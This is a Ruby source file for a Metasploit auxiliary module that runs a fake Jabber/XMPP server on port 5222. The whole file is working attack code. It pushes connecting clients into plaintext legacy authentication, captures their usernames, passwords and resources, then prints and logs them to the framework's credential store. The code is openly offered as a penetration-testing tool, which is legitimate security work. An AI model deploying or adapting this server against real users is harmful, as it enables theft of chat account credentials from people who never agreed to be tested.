##
# jabber.rb 
##

require 'msf/core'
require 'rexml/document'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::TcpServer
	include Msf::Auxiliary::Report
	include REXML
	
	def initialize
		super(
			'Name'        => 'Authentication Capture: Jabber',
			'Version'     => '0,1',
			'Description'    => %q{
				This module provides a fake Jabber service that
			is designed to capture authentication credentials,by trying
			to force plaintext authentification
			},
			'Author'      => ['spider'],
			'License'     => MSF_LICENSE,
			'Actions'     =>
				[
				 	[ 'Capture' ]
				],
			'PassiveActions' => 
				[
					'Capture'
				],
			'DefaultAction'  => 'Capture'
		)

		register_options(
			[
				OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 5222 ])
			], self.class)
	end

	def setup
		super
		@state = {}
	end

	def run
		exploit()
	end
	
	def on_client_connect(c)
		print_status("jabber connect: #{c.peerhost}")
		@state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :host => nil, :user => nil, :pass => nil, :ressource =>nil }
	end

	
	def on_client_data(c)
		data = c.get
		return if not data
		if (@state[c][:user] and @state[c][:pass])
			c.put "<stream:error><system-shutdown xmlns='urn:ietf:params:xml:ns:xmpp-streams'/></stream:error></stream:stream>"
			return
		end
		data += "</stream:stream>" if data =~ /stream:stream/
		doc = REXML::Document.new(data)
		cmd = doc.root.name
		if(cmd == "stream")
			host = doc.root.attributes['to']
			@state[c][:host] = host
			c.put "<?xml version='1.0'?><stream:stream xmlns:stream='http://etherx.jabber.org/streams' id='49826421' xmlns='jabber:client' from='"+ host+ "'>"
		elsif(cmd == "iq")
			type = doc.root.attributes['type']
			id = doc.root.attributes['id']
			c.put "<iq type='result' id='"+id+"'>"
			if (type == "get")
				if (doc.elements["//username"])
					user = doc.elements["//username"].text
					@state[c][:user] = user
					c.put "<query xmlns='jabber:iq:auth'><username>"+user+"</username><password/><resource/></query>"
				elsif
					c.put "<stream:error><xml-not-well-formed xmlns='urn:ietf:params:xml:ns:xmpp-streams'/></stream:error></stream:stream>"
				end
			elsif (type == "set")
				if (doc.elements["//password"])
					@state[c][:pass] = doc.elements["//password"].text
					@state[c][:res] = doc.elements["//resource"].text
					print_status(	@state[c][:ip]+
							": user:"+@state[c][:user]+
							" pwd:"+@state[c][:pass]+
							" res:"+@state[c][:res]+
						    	" host:"+@state[c][:host])
					report_auth_info(
						:host      => @state[c][:ip],
						:proto     => 'jabber',
						:targ_host => @state[c][:host],
						:user      => @state[c][:user],
						:pass      => @state[c][:pass],
						:extra     => @state[c][:res]
					)

				elsif
					c.put "<stream:error><xml-not-well-formed xmlns='urn:ietf:params:xml:ns:xmpp-streams'/></stream:error></stream:stream>"
				end
			end
			c.put "</iq>"
		end
		return
	end
	
	def on_client_close(c)
		@state.delete(c)
	end


end
